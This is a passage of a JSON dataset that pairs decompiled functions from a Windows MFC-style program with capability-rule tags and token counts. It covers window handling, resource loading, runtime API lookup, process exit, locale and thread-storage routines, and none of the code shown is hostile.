        "decompiled_code": "\nint32_t __cdecl fcn.004336e3(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != 0) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "00433a06": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00433a06(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x00433a35;\n    iVar3 = fcn.004339cd();\n    if ((iVar3 == 0) && (iVar3 = fcn.004015c0(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x00433a35:\n            uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar6 != 0)) {\n        iVar6 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar6);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar5 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar5 == 0)) || (iVar3 == iVar6))\n        {\n            *param_2 = 0;\n        }\n        else {\n            *param_2 = iVar3;\n            (*_sym.imp.USER32.dll_EnableWindow)(iVar3, 0);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 484
    },
    "004345e7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004345e7(int32_t param_1, int32_t param_2)\n\n{\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_2 = fcn.0042d90b();\n    } while (param_2 != 0);\n    return 0;\n}\n",
        "token_count": 77
    },
    "0043637b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043637b(void)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFrameWnd.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.004360a8();\n    iVar3 = fcn.00438808();\n    ppcVar1 = *(iVar3 + 0xec);\n    while (ppcVar1 == extraout_ECX) {\n        puVar2 = *(iVar3 + 0xf0);\n        *(puVar2[1] + 0xec) = *puVar2;\n        *(puVar2[1] + 0xf0) = puVar2[2];\n        puVar2[1] = 0;\n        ppcVar1 = *(iVar3 + 0xec);\n    }\n    if (extraout_ECX[0x2e] != NULL) {\n        fcn.0042f834(extraout_ECX[0x2e]);\n    }\n    fcn.004014f0();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042a2a9();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042d346();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 393
    },
    "00438ba9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00438ba9(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_1;\n    uVar3 = 0;\n    if (iVar4 != 0) {\n        if (iVar4 == param_2) {\n            *param_1 = *(param_2 + param_1[1]);\n        }\n        else {\n            iVar1 = param_1[1];\n            do {\n                iVar2 = *(iVar1 + iVar4);\n                if (iVar2 == param_2) break;\n                iVar4 = iVar2;\n            } while (iVar2 != 0);\n            if (iVar4 == 0) {\n                return 0;\n            }\n            *(iVar1 + iVar4) = *(iVar1 + param_2);\n        }\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 222
    },
    "00438c32": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438c32(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint lpCriticalSection;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x1c);\n    if ((0 < arg_8h) && (arg_8h < *(in_ECX + 0xc))) {\n        for (iVar3 = *(in_ECX + 0x14); iVar3 != 0; iVar3 = *(iVar3 + 4)) {\n            if (arg_8h < *(iVar3 + 8)) {\n                puVar2 = *(*(iVar3 + 0xc) + arg_8h * 4);\n                if (puVar2 != NULL) {\n                    (***puVar2)(1);\n                }\n                *(*(iVar3 + 0xc) + arg_8h * 4) = 0;\n            }\n        }\n        puVar1 = *(in_ECX + 0x10) + arg_8h * 8;\n        *puVar1 = *puVar1 & 0xfffffffe;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x1c);\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "0043b103": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043b103(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00438818();\n    fcn.00439038(0);\n    for (iVar1 = *(iVar1 + 0x24); iVar1 != 0; iVar1 = *(iVar1 + 0x1c)) {\n        fcn.0043b0e2();\n    }\n    fcn.0043909b(0);\n    return;\n}\n",
        "token_count": 104
    },
    "0042b3b9": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0042b3b9(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.0042b38e(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 78
    },
    "0042e8ed": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0042e8ed(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.00438818();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.0042da52(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 263
    },
    "0040e7cb": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.0040e7cb(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x450114 != 0) {\n        return *0x450108 != 0;\n    }\n    *0x450118 = fcn.0040e77e();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x4500f8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x43ec2c),  *0x4500f8 != 0)) &&\n         (*0x4500fc = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x4500fc != 0)) &&\n        ((*0x450100 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x450100 != 0 &&\n         (*0x450104 = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x450104 != 0)))) &&\n       ((*0x45010c = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x45010c != 0 &&\n        ((*0x450108 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x450108 != 0 &&\n         (*0x450110 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x450110 != 0)))))) {\n        *0x450114 = 1;\n        return true;\n    }\n    *0x4500f8 = 0;\n    *0x4500fc = 0;\n    *0x450100 = 0;\n    *0x450104 = 0;\n    *0x450108 = 0;\n    *0x45010c = 0;\n    *0x450110 = 0;\n    *0x450114 = 1;\n    return false;\n}\n",
        "token_count": 454
    },
    "004198e3": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004198e3(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 153
    },
    "0042bf6d": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.0042bf6d(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t unaff_ESI;\n    uint32_t uVar5;\n    uint unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"COMCTL32.DLL\");\n    uVar5 = uVar2;\n    if (uVar2 != 0) {\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x43f018);\n        uVar5 = 0;\n        if (pcVar3 == NULL) {\n            if ((unaff_ESI & 0x3fc0) == unaff_ESI) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = 0x3fc0;\n            }\n        }\n        else {\n            iVar4 = (*pcVar3)(unaff_EDI);\n            if ((iVar4 != 0) && (uVar5 = unaff_ESI,  iVar1 == 0)) {\n                (*_sym.imp.COMCTL32.dll_InitCommonControls)();\n                uVar5 = unaff_ESI | 0x3fc0;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 335
    },
    "004249f9": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004249f9(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.00419e80(&lpLCData);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 135
    },
    "0043859e": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043859e(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.00418911(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00438ab5": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00438ab5(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if ((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if ((iVar1 != 0) && (unaff_retaddr < *(iVar1 + 8))) {\n            uVar2 = *(*(iVar1 + 0xc) + unaff_retaddr * 4);\n            goto code_r0x00438aec;\n        }\n    }\n    uVar2 = 0;\ncode_r0x00438aec:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return uVar2;\n}\n",
        "token_count": 208
    }
}